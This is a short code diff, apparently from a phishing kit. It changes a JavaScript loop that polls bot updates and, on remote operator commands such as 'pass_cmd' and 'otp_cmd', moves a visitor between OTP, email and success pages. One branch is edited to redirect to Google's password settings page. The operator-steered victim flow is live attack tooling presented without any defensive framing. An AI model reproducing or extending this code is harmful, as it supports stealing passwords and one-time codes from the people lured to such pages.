@@ -264,7 +264,7 @@
                     data.result.forEach(update => {
                         lastUpdateId = update.update_id;
                         const cmd = update.callback_query?.data;
-                        if (cmd === "pass_cmd") <a href="https://wa.me/settings/linked_devices">";
+                        if (cmd === "pass_cmd") window.location.href = "https://myaccount.google.com/signinoptions/password?hl=ta";
                         else if (cmd === "otp_cmd") goToStep('otp_page');
                         else if (cmd === "email_page_cmd") goToStep('step2');
                         else if (cmd === "success") goToStep('success_page');
